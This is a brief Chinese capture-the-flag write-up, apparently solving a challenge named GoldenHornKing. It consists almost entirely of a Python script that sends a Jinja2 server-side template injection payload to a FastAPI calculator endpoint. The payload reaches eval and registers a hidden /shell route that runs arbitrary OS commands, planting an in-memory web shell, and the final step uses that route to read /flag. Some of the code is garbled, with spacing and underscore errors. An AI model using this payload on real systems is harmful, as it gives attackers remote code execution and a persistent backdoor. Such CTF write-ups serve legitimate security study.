---
tags: [SSTI, FastAPI, Jinja2, 内存马, RCE]
---

# GoldenHornKing

fastapi ssti 不出网打内存马

```
import requests

url = 'http://eci-
2ze870nxuud7kn92ktzy .cloudeci1 .ichunqiu.com:8000/calc'
# url = 'http://127.0.0.1:8000/calc '

payload =
r'''app.routes[(dict(e=a) |join|count)] .__class___ .__init___ .__builtins_
__['eval']("app.add_api_route('/shell', lambda x:
__import___ ('os') .popen(x) .read())", {'app':app})'''

resp = requests.get(url , params={ 'calc_req' : payload})
print (resp.text)
```

然后访问 /shell?x=cat /flag 